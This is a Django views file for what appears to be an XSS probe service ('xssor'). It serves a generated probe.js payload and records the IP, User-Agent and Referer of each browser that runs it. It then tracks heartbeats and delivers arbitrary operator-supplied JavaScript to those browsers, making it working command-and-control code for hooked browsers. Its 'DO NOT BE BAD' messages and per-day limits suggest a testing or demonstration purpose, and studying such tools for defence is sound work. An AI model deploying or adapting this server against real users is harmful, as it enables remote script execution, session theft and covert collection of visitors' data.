import os
import glob
import time
import hashlib
import simplejson

from django.shortcuts import render
from django.http import HttpResponse

BASEDIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))    
PROBEDIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'probe')

def now_time():
    """2037-03-07 13:30:07"""
    return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))

def to_time(timestr):
    """2037-03-07 13:30:07 -> 2120063407.0"""
    try:
        timestr = str(timestr)
        t=time.strptime(timestr,'%Y-%m-%d %H:%M:%S')
        return time.mktime(t)
    except:
        return time.time()

def __md5(v):
    m = hashlib.md5()
    m.update(v.encode('utf-8'))
    return m.hexdigest()

def __getpid(ip):
    abcdef = 'abcdefghijklmnopqrstuvwxyz'
    fedcba = 'zyawvubsrjponmlkqihgfedctx'
    h1 = __md5('<%s>'%ip)
    h2 = __md5('</%s>'%h1)
    h = h1 + h2
    j = 0
    adict = {}
    for i in h:
        if not i.isalpha():
            continue
        if j >= 26:
            adict[j-26] = i
        else:
            adict[j] = i
        j += 1
    a = []
    for j in adict:
        pos = abcdef.index(adict[j]) + j
        if pos >= 26:
            pos = pos - 26
        a.append(fedcba[pos])
    s1 = ''.join(a)
    if len(s1) >= 7:
        s2 = s1[:7]
    else:
        s2 = s1.ljust(7, s1[0])
    return s2

def __reqisok(req):
    ua = req.META.get('HTTP_USER_AGENT', '')
    pid = req.POST.get('pid', '')
    if not pid:
        pid = req.GET.get('pid', '')
    if not pid or not pid.isalpha() or len(pid) != 7 or not ua:
        return 0
    return 1

def __status(req):
    ip = req.META.get('REMOTE_ADDR','')
    pid = __getpid(ip)
    probe_js = os.path.join(PROBEDIR, '%s.js'%pid)
    probe_txt = os.path.join(PROBEDIR, '%s.txt'%pid)
    probe_cmd = os.path.join(PROBEDIR, '%s.cmd'%pid)
    probe_heartbeet = os.path.join(PROBEDIR, '%s.heartbeet'%pid)
    
    probe_existed = 0
    if os.path.exists(probe_js):
        probe_existed = 1
    
    probe_done = 0
    if os.path.exists(probe_txt):
        probe_done = 1

    probe_live = 0
    try:
        f = open(probe_heartbeet)
        c = f.read()
        f.close()
    except:
        c = ''
    if c:
        if(time.time() - to_time(c) <= 7):
            probe_live = 1

    probe_cmd_c = ''
    try:
        f = open(probe_cmd)
        c = f.read()
        f.close()
    except:
        c = ''
    if c:
        probe_cmd_c = c
    
    return {
        'pid': pid,
        'probe_existed': probe_existed,
        'probe_done': probe_done,
        'probe_live': probe_live,
        'probe_cmd_c': probe_cmd_c,
    }

def index(req):
    return render(req, 'index.html', __status(req))

def probe_status(req):
    if not __reqisok(req):
        rnt = {'succ': 0, 'msg': 'Probe status fetched failed. DO NOT BE BAD.'}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    ip = req.META.get('REMOTE_ADDR','')
    pid1 = __getpid(ip)
    pid2 = req.POST.get('pid', '')
    if pid1 != pid2:
        rnt = {'succ': 0, 'msg': 'Probe status fetched failed. Probe string must be: %s'%pid1}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp

    rnt = {'succ': 1, 'msg': 'Probe status fetched success.'}
    rnt.update(__status(req))
    resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
    return resp

def cmd_create(req):
    if not __reqisok(req):
        rnt = {'succ': 0, 'msg': 'CMD created failed. DO NOT BE BAD.'}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    ip = req.META.get('REMOTE_ADDR','')
    pid1 = __getpid(ip)
    pid2 = req.POST.get('pid', '')
    if pid1 != pid2:
        rnt = {'succ': 0, 'msg': 'CMD created failed. Probe string must be: %s'%pid1}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    
    c = req.POST.get('cmd', '')
    f = open(os.path.join(PROBEDIR, '%s.cmd'%pid1), 'w')
    f.write(c)
    f.close()

    rnt = {'succ': 1, 'msg': 'CMD created success. Just wait for some seconds.'}
    resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
    return resp

def cmd(req):
    if not __reqisok(req):
        resp = HttpResponse('alert("DO NOT BE BAD.");', content_type='application/x-javascript')
        return resp
    
    ip = req.META.get('REMOTE_ADDR','')
    ua = req.META.get('HTTP_USER_AGENT','-')
    referer = req.META.get('HTTP_REFERER','-')
    getdict = req.GET.dict()
    getstr = str(getdict)
    pid = getdict.get('pid', '')
    probe_txt = os.path.join(PROBEDIR, '%s.txt'%pid)
    probe_js = os.path.join(PROBEDIR, '%s.js'%pid)
    
    if not os.path.exists(probe_js):
        r = 'alert(/DO NOT BE BAD/);'
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp
        
    if not os.path.exists(probe_txt):
        c = "IP: %s\nUser-Agent: %s\nReferer: %s\n%s\n\n"%(ip, ua, referer, getstr)
        try:
            f = open(probe_txt, 'w')
            f.write(c)
            f.close()
        except:
            r = 'xssor.done=0;'
            resp = HttpResponse(r, content_type='application/x-javascript')
            return resp
        r = 'xssor.done=1;'
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp
    else:
        probe_heartbeet = os.path.join(PROBEDIR, '%s.heartbeet'%pid)
        try:
            f = open(probe_heartbeet, 'w')
            f.write(now_time())
            f.close()
        except:
            pass
        
        probe_cmd = os.path.join(PROBEDIR, '%s.cmd'%pid)
        try:
            f = open(probe_cmd)
            c = f.read().strip()
            f.close()
        except:
            c = '' 
        try:
            if c:
                f = open(probe_cmd, 'w') # wipe
                f.write('')
                f.close()
        except:
            pass
        if not c:
            c = 'xssor.heartbeet=1;' 
        
        r = c
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp

def probe_create(req):
    if not __reqisok(req):
        rnt = {'succ': 0, 'msg': 'Probe created failed. DO NOT BE BAD.'}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    ip = req.META.get('REMOTE_ADDR','')
    pid1 = __getpid(ip)
    pid2 = req.POST.get('pid', '')
    if pid1 != pid2:
        rnt = {'succ': 0, 'msg': 'Probe created failed. Probe string must be: %s'%pid1}
        resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
        return resp
    
    f = open(os.path.join(BASEDIR, 'payload/probe.js'))
    c = f.read()
    f.close()
    c = c.replace('abcdefg', pid1)
    f = open(os.path.join(PROBEDIR, '%s.js'%pid1), 'w')
    f.write(c)
    f.close()

    rnt = {'succ': 1, 'msg': 'Probe created success. Probe %s.js'%pid1}
    resp = HttpResponse(simplejson.dumps(rnt, ensure_ascii=False), content_type='application/json')
    return resp

def probe_js(req, pid):
    probe_txt = os.path.join(PROBEDIR, '%s.txt'%pid)
    if os.path.exists(probe_txt):
        r = 'xssorsay="One time per day, u can try again tomorrow.";'
        resp = HttpResponse(r, content_type='application/x-javascript')
        return resp
    try:
        f = open(os.path.join(PROBEDIR, '%s.js'%pid))
        c = f.read()
        f.close()
    except:
        c = 'alert(/DO NOT BE BAD/);'
    resp = HttpResponse(c, content_type='application/x-javascript')
    return resp
    
def probe_txt(req, pid):
    try:
        f = open(os.path.join(PROBEDIR, '%s.txt'%pid))
        c = f.read()
        f.close()
    except:
        c = '-'
    resp = HttpResponse(c, content_type='text/plain')
    return resp
    
